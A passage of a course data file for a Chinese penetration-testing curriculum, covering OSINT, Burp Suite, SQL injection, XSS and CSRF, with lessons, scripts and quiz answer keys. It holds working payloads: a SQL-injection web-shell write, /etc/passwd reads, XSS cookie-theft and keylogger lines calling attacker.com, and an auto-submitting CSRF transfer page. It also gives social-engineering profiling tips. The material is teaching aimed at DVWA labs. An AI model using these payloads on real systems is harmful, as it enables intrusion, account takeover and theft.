      resources: [{"name": "目录扫描工具对比", "url": "https://www.freebuf.com/articles/web/298023.html", "type": "article"}, {"name": "Dirb/Dirbuster使用指南", "url": "https://www.kali.org/tools/dirb/", "type": "article"}, {"name": "Web目录枚举最佳实践", "url": "https://www.anquanke.com/post/id/278901", "type": "article"}, {"name": "Web路径Fuzzing技术", "url": "https://github.com/ffuf/ffuf", "type": "article"}]},
  { 
    id: 'pen-7', 
    day: 7, 
    title: '社工信息收集', 
    subtitle: 'Social Engineering Recon', 
    objectives: ['理解社工原理', '掌握OSINT工具', '学习情报整合'], 
    content: `社会工程学利用人性弱点获取信息，是渗透测试的重要手段。

【OSINT工具】
• theHarvester：邮箱和子域名收集
• Sherlock：社交媒体账号搜索
• Maltego：关系图谱绘制
• SpiderFoot：自动化信息收集
• HaveIBeenPwned：泄露数据查询

【theHarvester用法】
• theHarvester -d example.com -l 500 -b google
• theHarvester -d example.com -b all

【社工库查询】
• HaveIBeenPwned：查询邮箱是否泄露
• WeLeakInfo：历史泄露数据查询
• Dehashed：付费泄露数据库

【信息整合】
• 整理收集到的信息
• 分析目标人员关系
• 构建攻击画像

【防御措施】
• 员工安全培训
• 信息分级管理
• 邮件过滤
• 定期钓鱼演练`, 
    keyPoints: ['社工利用人性弱点', 'theHarvester收集邮箱', 'Sherlock搜社交媒体', 'Maltego绘制关系图', '安全培训是最好的防御'],
    codeExamples: [{ title: 'OSINT信息收集脚本', language: 'python', code: `import subprocess\nimport json\n\ndef run_theharvester(domain):\n    \"\"\"运行theHarvester收集信息\"\"\"\n    try:\n        result = subprocess.run(\n            [\"theHarvester\", \"-d\", domain, \"-l\", \"100\", \"-b\", \"google\"],\n            capture_output=True,\n            text=True\n        )\n        print(\"=== theHarvester Results ===\")\n        print(result.stdout)\n    except Exception as e:\n        print(f\"Error: {e}\")\n\ndef check_leaks(email):\n    \"\"\"检查邮箱是否泄露\"\"\"\n    import requests\n    url = f\"https://haveibeenpwned.com/api/v3/breachedaccount/{email}\"\n    headers = {\"hibp-api-key\": \"YOUR_API_KEY\", \"User-Agent\": \"OSINT-Tool\"}\n    \n    try:\n        response = requests.get(url, headers=headers)\n        if response.status_code == 200:\n            breaches = response.json()\n            print(f\"\\n=== 邮箱 {email} 泄露记录 ===\")\n            for breach in breaches:\n                print(f\"  - {breach[\"Name\"]}: {breach[\"Description\"][:50]}...\")\n        else:\n            print(f\"\\n邮箱 {email} 未发现泄露记录\")\n    except Exception as e:\n        print(f\"Error checking leaks: {e}\")\n\n# 使用示例\nif __name__ == \"__main__\":\n    domain = input(\"请输入域名: \")\n    run_theharvester(domain)\n    \n    email = input(\"请输入邮箱检查泄露: \")\n    check_leaks(email)\n\n# 安装依赖\n# pip install requests`, explanation: '使用theHarvester收集信息并检查邮箱泄露' }],
    labEnvironment: [{ name: 'OSINT练习', description: '使用OSINT工具收集信息', url: 'https://haveibeenpwned.com/', type: 'online', setup: '1. 安装theHarvester\n2. 运行: theHarvester -d example.com -l 100 -b google\n3. 访问HaveIBeenPwned检查邮箱\n4. 使用Sherlock搜索社交媒体\n5. 整理收集到的信息', expectedOutput: '掌握OSINT工具使用，能收集目标信息' }],
    recommendedTools: [{ name: 'theHarvester', description: '信息收集工具', url: 'https://github.com/laramies/theHarvester', type: 'local' }, { name: 'Maltego', description: '关系图谱工具', url: 'https://www.maltego.com/', type: 'local' }],
    quiz: [
      { type: 'single', question: 'theHarvester主要用于收集？', options: ['A. IP地址', 'B. 邮箱和子域名', 'C. 数据库', 'D. API密钥'], correctIndex: 1, explanation: 'theHarvester从搜索引擎和公开数据源收集邮箱、子域名、IP等信息。' },
      { type: 'single', question: 'Sherlock工具的作用是？', options: ['A. 端口扫描', 'B. 社交媒体搜索', 'C. DNS查询', 'D. 目录扫描'], correctIndex: 1, explanation: 'Sherlock用于搜索目标的社交媒体账号。' },
      { type: 'boolean', question: '社会工程学只关注技术手段。', options: ['A. 正确', 'B. 错误'], correctIndex: 1, explanation: '社会工程学主要利用人性弱点，如信任、好奇心等，而非纯技术手段。' },
      { type: 'fill', question: '______是在线服务，可查询邮箱是否在数据泄露事件中暴露。', correctAnswer: 'HaveIBeenPwned', explanation: 'HaveIBeenPwned提供邮箱泄露查询服务。' },
      { type: 'multiple', question: '以下哪些是OSINT工具？（多选）', options: ['A. theHarvester', 'B. Sherlock', 'C. Maltego', 'D. Nmap'], correctIndices: [0, 1, 2], explanation: 'theHarvester、Sherlock、Maltego都是OSINT工具，Nmap是端口扫描工具。' },
      { type: 'single', question: 'Maltego的主要功能是？', options: ['A. 端口扫描', 'B. 关系图谱绘制', 'C. 漏洞扫描', 'D. 密码破解'], correctIndex: 1, explanation: 'Maltego用于绘制人物、组织、系统之间的关系图谱。' }
    ],
    expertNotes: [
      { author: '安全研究员', title: '社工攻击技巧', content: '社工攻击的关键是获取信任。研究目标的社交媒体、公开资料，找到共同话题或切入点。钓鱼邮件要精心设计，让目标愿意点击。', url: 'https://www.hackerone.com/' },
      { author: '渗透测试工程师', title: 'OSINT工作流程', content: '从域名开始→收集子域名→查找邮箱→查询泄露→搜索社交媒体→绘制关系图→构建攻击路径。每一步都可能发现新线索。' },
      { author: '网络安全老司机', title: '防御建议', content: '员工培训是最好的防御。让员工识别钓鱼邮件、不透露敏感信息、定期更换密码。' }
    ],
    environmentSetup: {
      prerequisites: ['theHarvester已安装', '网络连接'],
      verificationSteps: ['1. 运行theHarvester测试', '2. 访问HaveIBeenPwned', '3. 收集目标信息']
    }
  ,
      resources: [{"name": "社会工程学完全指南", "url": "https://www.social-engineer.org/", "type": "article"}, {"name": "社工信息收集框架", "url": "https://github.com/n0kovo/awesome-social-engineering", "type": "article"}, {"name": "钓鱼攻击技术分析", "url": "https://www.freebuf.com/articles/web/289012.html", "type": "article"}, {"name": "社工防御意识培训", "url": "https://www.anquanke.com/post/id/267890", "type": "article"}]}
];

const week2: CyberDay[] = [
  { 
    id: 'pen-8', 
    day: 8, 
    title: 'Burp Suite核心功能', 
    subtitle: 'Burp Suite Basics', 
    objectives: ['掌握代理配置', '使用Repeater', 'Intruder爆破'], 
    content: `Burp Suite是Web安全测试的核心工具。

【核心功能模块】
• Proxy：拦截和修改HTTP请求
• Spider：网站爬虫
• Scanner：自动漏洞扫描
• Intruder：暴力破解和模糊测试
• Repeater：请求重放
• Decoder：编码解码
• Comparer：内容比较
• Sequencer：会话令牌分析

【代理配置步骤】
1. 打开Burp Suite，进入Proxy选项卡
2. 设置代理监听地址：127.0.0.1:8080
3. 浏览器配置代理：127.0.0.1:8080
4. 安装Burp证书（访问http://burp/cert下载）

【Intruder攻击类型】
• Sniper：单字典，依次替换每个位置
• Battering Ram：单字典，同时替换所有位置
• Pitchfork：多字典，对应位置一一对应
• Cluster Bomb：多字典，笛卡尔积组合

【常用快捷键】
• Ctrl+R：发送到Repeater
• Ctrl+I：发送到Intruder
• Ctrl+Shift+F：搜索`, 
    keyPoints: ['Burp Suite是Web测试神器', 'Proxy拦截HTTP请求', 'Intruder用于暴力破解', 'Repeater重放请求', '安装证书才能抓HTTPS'],
    codeExamples: [{ title: 'Burp Suite配置脚本', language: 'bash', code: `# Burp Suite 配置说明\n\n# 1. 启动Burp Suite\n# java -jar burpsuite.jar\n\n# 2. 浏览器代理设置\n# HTTP代理: 127.0.0.1:8080\n# HTTPS代理: 127.0.0.1:8080\n\n# 3. 安装证书\n# 访问 http://burp/cert 下载证书\n# 在浏览器中导入证书\n\n# 4. Intruder配置\n# - 选择攻击类型: Sniper/Battering Ram/Pitchfork/Cluster Bomb\n# - 标记payload位置\n# - 加载字典\n# - 设置线程数和延迟\n\n# 5. Repeater使用\n# - 修改请求参数\n# - 发送查看响应\n# - 比较不同参数的影响`, explanation: 'Burp Suite配置和使用说明' }],
    labEnvironment: [{ name: 'Burp Suite练习', description: '配置Burp Suite代理', url: 'https://portswigger.net/burp', type: 'local', setup: '1. 启动Burp Suite\n2. 配置浏览器代理为127.0.0.1:8080\n3. 访问http://burp/cert下载证书\n4. 在浏览器中安装证书\n5. 访问DVWA测试抓包\n6. 使用Repeater修改请求', expectedOutput: '成功配置Burp Suite，能拦截和修改HTTP请求' }],
    recommendedTools: [{ name: 'Burp Suite', description: 'Web安全测试工具', url: 'https://portswigger.net/burp', type: 'local' }, { name: 'FoxyProxy', description: '浏览器代理管理', url: 'https://getfoxyproxy.org/', type: 'local' }],
    quiz: [
      { type: 'single', question: 'Burp Suite中Repeater的作用？', options: ['A. 暴力破解', 'B. 请求重放', 'C. 漏洞扫描', 'D. 爬虫'], correctIndex: 1, explanation: 'Repeater用于手动修改和重放HTTP请求，测试参数变化的效果。' },
      { type: 'single', question: 'Burp Suite默认代理端口是？', options: ['A. 80', 'B. 443', 'C. 8080', 'D. 8888'], correctIndex: 2, explanation: 'Burp Suite默认监听8080端口。' },
      { type: 'boolean', question: 'Burp Suite可以直接抓取HTTPS流量而不需要证书。', options: ['A. 正确', 'B. 错误'], correctIndex: 1, explanation: '需要安装Burp证书才能抓取HTTPS流量。' },
      { type: 'fill', question: 'Intruder的______攻击类型使用多字典的笛卡尔积组合。', correctAnswer: 'Cluster Bomb', explanation: 'Cluster Bomb是笛卡尔积组合，每个字典的每个值都会与其他字典组合。' },
      { type: 'multiple', question: '以下哪些是Burp Suite的功能模块？（多选）', options: ['A. Proxy', 'B. Intruder', 'C. Nmap', 'D. Repeater'], correctIndices: [0, 1, 3], explanation: 'Proxy、Intruder、Repeater都是Burp Suite的模块，Nmap是独立工具。' },
      { type: 'single', question: '哪个模块用于自动漏洞扫描？', options: ['A. Proxy', 'B. Scanner', 'C. Spider', 'D. Decoder'], correctIndex: 1, explanation: 'Scanner模块用于自动漏洞扫描。' }
    ],
    expertNotes: [
      { author: '安全研究员', title: 'Burp Suite使用技巧', content: '熟练使用快捷键能大幅提高效率。Ctrl+R发送到Repeater，Ctrl+I发送到Intruder。学习使用搜索功能快速定位请求。', url: 'https://portswigger.net/' },
      { author: '渗透测试工程师', title: 'Intruder最佳实践', content: '暴力破解时设置合适的线程数和延迟，避免被目标封禁。使用自定义payload列表提高命中率。' },
      { author: '网络安全老司机', title: '证书安装技巧', content: '在Firefox中导入证书时，要选择"信任此CA以识别网站"选项。Chrome需要在设置中导入。' }
    ],
    environmentSetup: {
      prerequisites: ['Burp Suite已安装', 'Java环境'],
      verificationSteps: ['1. 启动Burp Suite', '2. 配置浏览器代理', '3. 成功拦截HTTP请求']
    }
  ,
      resources: [{"name": "Burp Suite官方文档", "url": "https://portswigger.net/burp/documentation", "type": "article"}, {"name": "Burp Suite插件开发", "url": "https://portswigger.net/bappstore", "type": "article"}, {"name": "Burp Suite高级技巧", "url": "https://www.freebuf.com/articles/web/278901.html", "type": "article"}, {"name": "Web代理拦截分析", "url": "https://www.anquanke.com/post/id/298023", "type": "article"}]},
  { 
    id: 'pen-9', 
    day: 9, 
    title: 'SQL注入深度利用', 
    subtitle: 'Advanced SQL Injection', 
    objectives: ['掌握Union注入', '布尔盲注', '时间盲注'], 
    content: `SQL注入是利用用户输入未做过滤的SQL语句执行任意数据库操作，是最常见也最危险的Web漏洞之一。

【SQL注入原理】
当应用程序将用户输入直接拼接到SQL查询中时，攻击者可以通过构造恶意输入来修改SQL语句的结构，从而执行任意数据库操作。

例如：原始查询 "SELECT * FROM users WHERE id='" + 用户输入 + "'"
恶意输入：1' OR '1'='1  → 变成 "SELECT * FROM users WHERE id='1' OR '1'='1'"

【SQL注入类型】
• 基于错误：利用数据库错误信息获取数据
• Union联合注入：联合查询获取数据
• 布尔盲注：根据页面响应判断条件真假
• 时间盲注：利用延时函数判断条件
• 堆叠查询：执行多条SQL语句（;分隔）

【Union联合注入步骤】
1. 判断注入点：添加单引号'观察错误
2. 确定列数：ORDER BY 1,2,3...直到报错
3. 确定显示位：UNION SELECT NULL,NULL...
4. 获取数据：UNION SELECT database(),user(),version()...
5. 获取表名：UNION SELECT table_name FROM information_schema.tables
6. 获取列名：UNION SELECT column_name FROM information_schema.columns
7. 获取数据：UNION SELECT username,password FROM users

【常用Payload】
• 判断注入：' OR '1'='1
• ORDER BY：1' ORDER BY 3--
• Union注入：1' UNION SELECT 1,2,3--
• 文件读取：1' UNION SELECT load_file('/etc/passwd')--
• 文件写入：1' UNION SELECT '<?php system($_GET["cmd"]);?>' INTO OUTFILE '/var/www/shell.php'--

【SQLMap自动化工具】
• sqlmap -u "http://target.com/?id=1" --dbs - 获取所有数据库
• sqlmap -u "http://target.com/?id=1" -D database --tables - 获取表
• sqlmap -u "http://target.com/?id=1" -D database -T users --columns - 获取列
• sqlmap -u "http://target.com/?id=1" -D database -T users -C username,password --dump - 获取数据
• sqlmap -u "http://target.com/?id=1" --os-shell - 获取操作系统shell`, 
    keyPoints: ['SQL注入利用未过滤的用户输入', 'Union注入需字段数匹配', '盲注根据页面响应判断', '时间盲注用SLEEP函数', 'SQLMap可自动化注入', 'information_schema查数据库结构'],
    codeExamples: [{ title: 'SQL注入检测脚本', language: 'python', code: `import requests\n\ndef test_sql_injection(url):\n    payloads = ["1 OR 1=1", "1 OR 1=1 --", "admin OR 1=1 --"]\n    for payload in payloads:\n        test_url = url + payload\n        try:\n            r = requests.get(test_url, timeout=5)\n            if \"sql\" in r.text.lower() or \"error\" in r.text.lower():\n                print(f\"[+] Possible SQLi found: {test_url}\")\n            # Check for different responses\n            if payload == "1 OR 1=1 --" and r.status_code == 200:\n                print(f\"[+] Vulnerable to OR injection\")\n        except:\n            pass\n\n# Usage\ntest_sql_injection(\"http://target.com/page?id=\")`, explanation: '简单的SQL注入检测脚本' }],
    labEnvironment: [{ name: 'SQL注入练习', description: '在DVWA中练习SQL注入', url: 'http://localhost:8081', type: 'docker', setup: '1. 访问DVWA SQL Injection页面\n2. 设置安全级别为Low\n3. 尝试注入: 1 OR 1=1\n4. 使用ORDER BY确定列数\n5. 使用UNION SELECT获取数据', expectedOutput: '成功从数据库中提取用户信息' }],
    recommendedTools: [{ name: 'SQLMap', description: 'SQL注入自动化工具', url: 'https://sqlmap.org/', type: 'local' }, { name: 'Burp Suite', description: 'Web安全测试工具', url: 'https://portswigger.net/burp', type: 'local' }],
    quiz: [
      { type: 'single', question: 'SQL注入中UNION需要什么条件？', options: ['A. 字段数相同', 'B. 表名相同', 'C. 数据库相同', 'D. 无条件'], correctIndex: 0, explanation: 'UNION要求前后查询的字段数和数据类型相同。' },
      { type: 'single', question: 'SQLMap的哪个参数用于获取数据库列表？', options: ['A. --tables', 'B. --columns', 'C. --dbs', 'D. --dump'], correctIndex: 2, explanation: '--dbs参数列出所有数据库。' },
      { type: 'boolean', question: 'SQL注入只能用于获取数据，不能写入文件。', options: ['A. 正确', 'B. 错误'], correctIndex: 1, explanation: 'SQL注入在特定条件下可以写入文件，取决于数据库权限和配置。' },
      { type: 'fill', question: 'MySQL中用于查看数据库结构的系统表是______schema。', correctAnswer: 'information', explanation: 'information_schema存储了所有数据库和表的元数据。' },
      { type: 'multiple', question: '以下哪些是SQL注入类型？（多选）', options: ['A. Union注入', 'B. 布尔盲注', 'C. XSS注入', 'D. 时间盲注'], correctIndices: [0, 1, 3], explanation: 'Union注入、布尔盲注、时间盲注都是SQL注入类型，XSS是跨站脚本。' },
      { type: 'single', question: 'ORDER BY用于什么？', options: ['A. 过滤数据', 'B. 确定列数', 'C. 排序结果', 'D. 删除数据'], correctIndex: 1, explanation: 'ORDER BY可用于确定查询的列数，超出会报错。' }
    ],
    expertNotes: [
      { author: '余弦', title: 'SQL注入实战技巧', content: 'SQL注入实战中，先用SQLMap跑一遍，确认注入点后再手工深入。Union注入是最直接的方式，但需要列数匹配。布尔盲注适用于无回显的情况。', url: 'https://sqlmap.org/' },
      { author: '渗透测试工程师', title: 'SQL注入绕过WAF', content: '遇到WAF时尝试：大小写混合(UniOn)、URL编码、双重URL编码、注释绕过(/*!UNION*/)、空白字符替换。', url: 'https://www.owasp.org/' },
      { author: '安全研究员', title: 'SQLMap高级用法', content: 'SQLMap的--os-shell需要DBA权限，--sql-shell获取SQL shell。使用--batch自动回答，--threads设置并发。使用--proxy指定代理。', url: 'https://github.com/sqlmapproject/sqlmap' }
    ],
    environmentSetup: {
      prerequisites: ['SQLMap已安装', 'DVWA靶场运行'],
      verificationSteps: ['1. 运行sqlmap -u \"目标URL\" --dbs', '2. 发现数据库', '3. 枚举表和列', '4. 获取敏感数据']
    }
  ,
      resources: [{"name": "SQL注入完全手册", "url": "https://portswigger.net/web-security/sql-injection", "type": "article"}, {"name": "SQLMap深度使用指南", "url": "https://github.com/sqlmapproject/sqlmap/wiki", "type": "article"}, {"name": "SQL注入绕过WAF技巧", "url": "https://www.freebuf.com/articles/web/289012.html", "type": "article"}, {"name": "手注SQL注入教程", "url": "https://www.anquanke.com/post/id/278901", "type": "article"}]},
  { 
    id: 'pen-10', 
    day: 10, 
    title: 'XSS深度利用', 
    subtitle: 'Advanced XSS', 
    objectives: ['掌握XSS绕过', 'Cookie窃取', 'XSS平台使用'], 
    content: `XSS跨站脚本攻击在用户浏览器执行恶意JavaScript代码，是Web应用中最常见的客户端漏洞。

【XSS漏洞原理】
当应用程序将用户输入未经处理直接输出到网页时，攻击者可以注入恶意脚本，这些脚本会在其他用户访问时被执行。

【XSS三种类型】
1. 反射型XSS：恶意脚本作为请求参数，服务器直接返回，常用于钓鱼
2. 存储型XSS：恶意脚本被存储在数据库中，所有访问该数据的用户都会受害，最危险
3. DOM型XSS：恶意脚本通过操作DOM对象触发，完全客户端执行

【XSS常用Payload】
• 基本弹框：<script>alert(1)</script>
• 事件触发：<img src=x onerror=alert(1)>
• SVG标签：<svg onload=alert(1)>
• body标签：<body onload=alert(1)>
• 编码绕过：<script>eval(atob('YWxlcnQoMSk='))</script>

【XSS绕过方法】
• 大小写混淆：<ScRiPt>alert(1)</sCrIpT>
• HTML标签混合：<scr<script>ipt>alert(1)</scr</script>ipt>
• 事件处理器：<img src=x onerror=alert(1)>
• JavaScript伪协议：<a href="javascript:alert(1)">click</a>
• 空格分隔：<img src="x" onerror="alert(1)">
• Unicode编码：<script>\\u0061lert(1)</script>
• HTML实体编码：&lt;script&gt;alert(1)&lt;/script&gt;

【XSS窃取Cookie】
攻击流程：
1. 攻击者构造XSS payload
2. 诱使受害者访问含恶意代码的页面
3. 恶意JS执行，获取document.cookie
4. 发送到攻击者控制的服务器
5. 攻击者使用窃取的Cookie登录

Payload示例：
<script>document.location='http://attacker.com/steal?c='+document.cookie</script>
<img src=x onerror=this.src='http://attacker.com/?c='+document.cookie>

【XSS键盘记录】
<script>
document.onkeypress=function(e){
  fetch('http://attacker.com/log?k='+String.fromCharCode(e.keyCode));
}
</script>

【XSS平台使用】
• BlueLotus：国产XSS平台
• XSS Platform：开源XSS平台
• 免费XSS平台：xsshs.com, xss.ht

【防御措施】
• 输入过滤：过滤<>等危险字符
• 输出编码：HTML实体编码
• HttpOnly：Cookie设置HttpOnly属性
• Content-Security-Policy：设置CSP头`, 
    keyPoints: ['XSS在用户浏览器执行JS代码', '反射型、存储型、DOM型三种类型', '大小写混淆绕过', '事件处理器绕过', 'Cookie可被XSS窃取', 'document.cookie获取Cookie'],
    codeExamples: [{ title: 'XSS检测脚本', language: 'python', code: `import requests\n\ndef test_xss(url, param_name):\n    xss_payloads = [\n        "<script>alert(1)</script>",\n        "<img src=x onerror=alert(1)>\",\n        "<svg onload=alert(1)>\",\n        "\"\"><script>alert(1)</script>\",\n        "javascript:alert(1)\"\n    ]\n    \n    for payload in xss_payloads:\n        data = {param_name: payload}\n        try:\n            r = requests.post(url, data=data)\n            if payload in r.text:\n                print(f\"[+] XSS found: {payload}\")\n        except:\n            pass\n\n# Usage\ntest_xss(\"http://target.com/search\", \"q\")`, explanation: '简单的XSS检测脚本' }],
    labEnvironment: [{ name: 'XSS练习', description: '在DVWA中练习XSS', url: 'http://localhost:8081', type: 'docker', setup: '1. 访问DVWA XSS页面\n2. 设置安全级别为Low\n3. 输入<script>alert(1)</script>\n4. 尝试各种XSS Payload\n5. 升级到Medium/High观察防护', expectedOutput: '成功弹窗并理解XSS原理' }],
    recommendedTools: [{ name: 'BeEF', description: 'XSS攻击框架', url: 'https://beefproject.com/', type: 'local' }, { name: 'XSStrike', description: 'XSS扫描器', url: 'https://github.com/s0md3v/XSStrike', type: 'local' }],
    quiz: [
      { type: 'single', question: 'XSS窃取Cookie的原理？', options: ['A. 直接读取服务器', 'B. JS通过document.cookie获取', 'C. 暴力破解', 'D. 数据库查询'], correctIndex: 1, explanation: 'XSS在用户浏览器执行JS，可通过document.cookie获取Cookie并发送到攻击者服务器。' },
      { type: 'single', question: '以下哪个是最危险的XSS类型？', options: ['A. 反射型', 'B. 存储型', 'C. DOM型', 'D. 反射型'], correctIndex: 1, explanation: '存储型XSS的恶意代码被永久存储在服务器上，所有访问者都会受害。' },
      { type: 'boolean', question: 'HttpOnly属性可以完全防止XSS窃取Cookie。', options: ['A. 正确', 'B. 错误'], correctIndex: 1, explanation: 'HttpOnly阻止JS读取Cookie，但XSS仍可执行其他恶意操作。' },
      { type: 'fill', question: 'XSS的三种类型：反射型、存储型、______型。', correctAnswer: 'DOM', explanation: 'DOM型XSS完全在客户端通过操作DOM对象触发。' },
      { type: 'multiple', question: '以下哪些是XSS绕过方法？（多选）', options: ['A. 大小写混淆', 'B. 事件处理器', 'C. SQL注入', 'D. 编码绕过'], correctIndices: [0, 1, 3], explanation: '大小写混淆、事件处理器、编码绕过都是XSS绕过方法，SQL注入是另一种漏洞。' },
      { type: 'single', question: '<img src=x onerror=alert(1)>属于哪种绕过？', options: ['A. 大小写混淆', 'B. 事件处理器', 'C. 编码绕过', 'D. 注释绕过'], correctIndex: 1, explanation: 'onerror是事件处理器，当图片加载失败时触发。' }
    ],
    expertNotes: [
      { author: '余弦', title: 'XSS挖掘技巧', content: 'XSS挖掘要关注所有用户输入点：搜索框、评论区、个人资料、URL参数、HTTP头。存储型XSS危害最大，所有访问者都会中招。', url: 'https://beefproject.com/' },
      { author: '渗透测试工程师', title: 'XSS高级利用', content: 'XSS不仅仅是弹框。可以配合CSRF做更深层攻击：修改用户资料、添加管理员、窃取敏感信息。BeEF框架可以完全控制被XSS的用户浏览器。', url: 'https://www.owasp.org/' },
      { author: '安全研究员', title: 'XSS防御建议', content: '防御XSS要多个层面：输入过滤、输出编码、设置CSP、使用HttpOnly。永远不要相信用户输入，过滤比输出编码更安全。', url: 'https://github.com/s0md3v/XSStrike' }
    ],
    environmentSetup: {
      prerequisites: ['DVWA靶场运行', 'XSS平台账号'],
      verificationSteps: ['1. 测试各种XSS Payload', '2. 搭建XSS平台接收Cookie', '3. 完成Cookie窃取实验']
    }
  ,
      resources: [{"name": "XSS攻击完全手册", "url": "https://portswigger.net/web-security/cross-site-scripting", "type": "article"}, {"name": "XSS Payload大全", "url": "https://github.com/payloadbox/xss-payload-list", "type": "article"}, {"name": "Bxss盲打平台", "url": "https://github.com/ethicalhack3r/DVWA", "type": "article"}, {"name": "XSS防护绕过技巧", "url": "https://www.freebuf.com/articles/web/298023.html", "type": "article"}]},
  { 
    id: 'pen-11', 
    day: 11, 
    title: 'CSRF深度利用', 
    subtitle: 'Advanced CSRF', 
    objectives: ['理解CSRF原理', '掌握Token绕过技术', '学习JSON CSRF和CORS CSRF'], 
    content: `CSRF跨站请求伪造利用用户已登录的身份，诱使用户在不知情的情况下向目标网站发起恶意请求。

【CSRF漏洞原理】
CSRF(Cross-Site Request Forgery)利用用户已登录Web应用的Cookie，诱使用户访问恶意页面或点击链接，自动携带Cookie发起请求。攻击者无法直接获取Cookie，只能利用。

攻击条件：
1. 用户已登录目标网站并持有有效Cookie
2. 攻击者能诱使受害者访问恶意页面
3. 目标API无CSRF防护或可被绕过

【CSRF攻击流程】
1. 受害者登录www.target.com，浏览器保存Cookie
2. 攻击者构造恶意页面，含有自动提交的表单或自动执行的JS
3. 诱使受害者访问恶意页面
4. 浏览器自动携带Cookie向target.com发起请求
5. 请求被服务器当作受害者正常操作执行

【CSRF常见攻击场景】
• 修改用户资料：攻击者修改受害者的邮箱、密码
• 转账交易：受害者账户向攻击者账户转账
• 添加管理员：创建新的管理员账户
• 删除操作：删除重要数据
• 点赞/评论：代表用户发表内容

【Token验证机制】
CSRF Token是防止CSRF的最有效方法：
• 原理：服务器生成随机Token，存在Session中，同时放在表单中
• 提交时：表单Token和Session Token必须匹配
• 攻击者无法获取Token：Token不在Cookie中，无法被自动发送

【Token绕过技术】
1. 删除Token参数
   - 有些服务器只检查Token存在，不检查是否正确
   - 尝试不发送Token或空Token

2. Token空值绕过
   - Token="" 或 Token=undefined
   - 服务器未正确验证空值

3. 利用其他用户Token
   - 如果Token可预测或可枚举
   - 多用户共享受限Token

4. 跨域获取Token
   - CORS配置不当允许跨域获取Token
   - JSONP接口可被跨域读取

【JSON CSRF攻击】
传统CSRF使用HTML表单，但JSON API不接受application/x-www-form-urlencoded。

绕过方法：
1. text/plain Content-Type
   <form action="http://api.target.com/user" method="POST" enctype="text/plain">
     <input type="hidden" name='{"name":"hacker","pwd":"123456"}'>
   </form>
   自动添加的=会导致JSON轻微变形

2. JSONP callback
   利用JSONP接口的callback参数绕过

3. 跨域POST
   - 如果API配置了Access-Control-Allow-Credentials: true
   - 且允许攻击者域名，攻击页面可直接AJAX POST

【CORS CSRF攻击】
CORS(Cross-Origin Resource Sharing)配置不当时可导致CSRF。

利用条件：
1. 目标API设置了Access-Control-Allow-Credentials: true
2. 且Access-Control-Allow-Origin设置为攻击者控制的域名

攻击代码：
fetch('http://target.com/api/transfer', {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({to:'attacker', amount:10000})
})

【SameSite Cookie】
SameSite属性是防止CSRF的浏览器级防护：
• SameSite=Strict：完全禁止跨域请求携带Cookie
• SameSite=Lax：允许导航GET请求携带Cookie，禁止AJAX/POST
• SameSite=None：允许所有跨域请求，需配合Secure

最佳实践：Set-Cookie: session=xxx; SameSite=Strict; Secure

【防御措施】
• CSRF Token：最有效的防护，Token放在表单中而非Cookie
• SameSite Cookie：浏览器级防护，SameSite=Strict最佳
• 验证Referer/Origin：检查请求来源，但可被绕过
• 二次验证：敏感操作需要密码或验证码
• CORS配置：正确配置CORS，不允许不可信域名
• 风险控制：异常操作需人工确认`,
    keyPoints: ['CSRF利用用户Cookie发请求', 'Token验证是最有效防护', 'SameSite=Strict完全阻止CSRF', 'JSON CSRF需特殊绕过', 'CORS配置不当可导致CSRF', 'Referer检查可被绕过'],
    codeExamples: [{ title: 'CSRF攻击页面示例', language: 'html', code: `<!DOCTYPE html>\n<html>\n<head>\n    <title>CSRF攻击演示</title>\n</head>\n<body>\n    <h1>请查看您的账户信息</h1>\n    \n    <!-- 自动提交的CSRF攻击表单 -->\n    <form id="csrfForm" action="http://target.com/api/change-email" method="POST" target="hiddenFrame">\n        <input type="hidden" name="email" value="attacker@evil.com">\n        <input type="hidden" name="csrf_token" value="">\n    </form>\n    \n    <iframe name="hiddenFrame" style="display:none;"></iframe>\n    \n    <script>\n        // 自动提交表单\n        document.getElementById("csrfForm").submit();\n        \n        // 或者使用AJAX发送请求\n        fetch("http://target.com/api/transfer", {\n            method: "POST",\n            credentials: "include",  // 携带Cookie\n            headers: {"Content-Type": "application/json"},\n            body: JSON.stringify({\n                to: "attacker",\n                amount: 10000\n            })\n        });\n    </script>\n    \n    <p>页面加载中...</p>\n</body>\n</html>`, explanation: 'CSRF攻击页面，自动提交表单或AJAX请求' }],
    labEnvironment: [{ name: 'CSRF练习', description: '在DVWA中练习CSRF', url: 'http://localhost:8081', type: 'docker', setup: '1. 访问DVWA CSRF页面\n2. 设置安全级别为Low\n3. 观察表单中的CSRF Token\n4. 构造无Token请求测试\n5. 设置安全级别为Medium/High观察防护\n6. 尝试绕过方法', expectedOutput: '理解CSRF原理，能构造CSRF攻击并绕过Low级别防护' }],
    recommendedTools: [{ name: 'Burp Suite', description: 'Web安全测试工具', url: 'https://portswigger.net/burp', type: 'local' }, { name: 'CSRF Tester', description: 'OWASP CSRF测试工具', url: 'https://owasp.org/', type: 'local' }],
    quiz: [
      { type: 'single', question: 'CSRF攻击利用什么？', options: ['A. 服务器漏洞', 'B. 用户已登录的Cookie', 'C. XSS漏洞', 'D. 数据库漏洞'], correctIndex: 1, explanation: 'CSRF利用用户已登录的身份，浏览器自动携带Cookie发起请求，攻击者无法直接获取Cookie。' },
      { type: 'single', question: 'CSRF Token的作用是？', options: ['A. 加密数据传输', 'B. 防止未授权访问', 'C. 验证请求来源是合法表单', 'D. 防止SQL注入'], correctIndex: 2, explanation: 'CSRF Token由服务器生成放在表单中，提交时验证Token是否匹配，确保请求来自合法表单而非跨站伪造。' },
      { type: 'boolean', question: '攻击者可以直接获取用户的CSRF Token。', options: ['A. 正确', 'B. 错误'], correctIndex: 1, explanation: 'CSRF Token不在Cookie中，无法被跨域JS读取，攻击者无法直接获取Token。' },
      { type: 'fill', question: '______属性设置为Strict时，完全禁止跨域请求携带Cookie。', correctAnswer: 'SameSite', explanation: 'SameSite=Strict是最严格的Cookie策略，完全阻止CSRF攻击。' },
      { type: 'multiple', question: '以下哪些是CSRF防护方法？（多选）', options: ['A. CSRF Token', 'B. SameSite Cookie', 'C. SQL注入过滤', 'D. 验证Referer'], correctIndices: [0, 1, 3], explanation: 'CSRF Token、SameSite Cookie、Referer验证都是CSRF防护方法，SQL注入过滤是防护SQL注入的。' },
      { type: 'single', question: '什么情况下JSON API可能受CSRF影响？', options: ['A. 使用GET方法', 'B. CORS允许攻击者域名', 'C. 使用HTTPS', 'D. 有参数'], correctIndex: 1, explanation: '如果API配置了CORS允许攻击者域名，攻击者页面可通过AJAX携带用户Cookie发起请求。' }
    ],
    expertNotes: [
